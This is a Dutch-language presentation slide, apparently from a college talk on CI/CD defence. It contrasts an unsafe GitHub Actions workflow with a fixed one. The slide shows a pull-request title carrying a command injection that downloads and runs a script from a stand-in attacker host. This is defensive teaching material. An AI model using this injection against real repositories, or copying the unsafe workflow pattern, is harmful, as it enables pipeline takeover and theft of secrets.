@@ -1,0 +1,25 @@
+<section id="fout-beter" data-transition="fade" style="background:#FFFFFF;color:#3C3B40;font-family:'Source Sans 3', Arial, sans-serif;padding:128px 128px 160px;display:flex;flex-direction:column;gap:24px">
+<div style="display:flex;flex-direction:column;gap:16px">
+<p style="font-size:24px;font-weight:600;letter-spacing:3px;text-transform:uppercase;color:#005078">Je pipeline beveiligen</p>
+<h2 style="font-family:'League Gothic', 'Arial Narrow', sans-serif;font-size:80px;font-weight:400;line-height:1.05;letter-spacing:0;color:#232226">Zo begon s1ngularity</h2>
+</div>
+<div style="background:#232226;border-left:6px solid #FF5A5F;border-radius:12px;padding:24px 32px">
+<p style="font-family:'JetBrains Mono', 'Courier New', monospace;font-size:24px;line-height:1.5;color:#F1F1F1;white-space:nowrap"><span style="color:#FF5A5F"># FOUT: secrets en schrijfrechten, en de titel gaat letterlijk de shell in</span><br>on: pull_request_target<br>steps:<br>&#160;&#160;- run: echo "Titel: ${{ github.event.pull_request.title }}"</p>
+</div>
+<p style="font-family:'JetBrains Mono', 'Courier New', monospace;font-size:24px;line-height:1.4;color:#E60005">PR-titel: "; curl https://evil.example/x.sh | sh; echo "</p>
+<div style="display:flex;gap:64px;background:#232226;border-left:6px solid #4FC3D0;border-radius:12px;padding:24px 32px">
+<p style="font-family:'JetBrains Mono', 'Courier New', monospace;font-size:24px;line-height:1.5;color:#F1F1F1;white-space:nowrap"><span style="color:#4FC3D0"># BETER</span><br>on:<br>&#160;&#160;pull_request:<br>&#160;&#160;&#160;&#160;types: [opened, edited, synchronize, reopened]<br>permissions:<br>&#160;&#160;contents: read</p>
+<p style="font-family:'JetBrains Mono', 'Courier New', monospace;font-size:24px;line-height:1.5;color:#F1F1F1;white-space:nowrap"><span style="color:#9A999F"># in jobs.check-title:</span><br>steps:<br>&#160;&#160;- env:<br>&#160;&#160;&#160;&#160;&#160;&#160;TITLE: ${{ github.event.pull_request.title }}<br>&#160;&#160;&#160;&#160;run: echo "Titel: $TITLE"</p>
+</div>
+<p style="position:absolute;left:128px;bottom:64px;width:1440px;font-size:24px;color:#6B6A70">Deel 6 — Verdediging als maintainer en in CI/CD · 0:36–0:40</p>
+<img src="/_blob/4d3eecb01832b6f4111235aa00bb3842" alt="AP Hogeschool" style="position:absolute;right:128px;bottom:52px;height:56px;width:auto">
+<aside>De meeste CI-aanvallen uit deel 4 begonnen met één patroon: een workflow die invoer van een buitenstaander als code behandelt, met krachtige rechten.
+
+FOUT: pull_request_target draait in de context van de basisrepository, met secrets en schrijfrechten, ook voor een pull request uit een fork. En ${{ github.event.pull_request.title }} wordt door GitHub letterlijk in het shellscript geplakt, nog voor bash het ziet.
+
+Een PR met als titel “"; curl https://evil.example/x.sh | sh; echo "” sluit de echo af, voert het script van de aanvaller uit, en opent een nieuwe echo. Met toegang tot je secrets. Zo begon s1ngularity.
+
+BETER: een gewone pull_request-trigger (zonder secrets voor forks), minimale rechten, en de onvertrouwde titel via een omgevingsvariabele. Dan is $TITLE gewoon tekst voor bash, geen code. De types-regel zorgt dat de check ook opnieuw draait als iemand de titel wijzigt (edited zit niet in de standaardtypes).
+
+Vraag aan de zaal: “Wie heeft ooit ${{ }} in een run-stap gezet?” Laat ze vandaag nog zizmor over hun workflows draaien.</aside>
+</section>
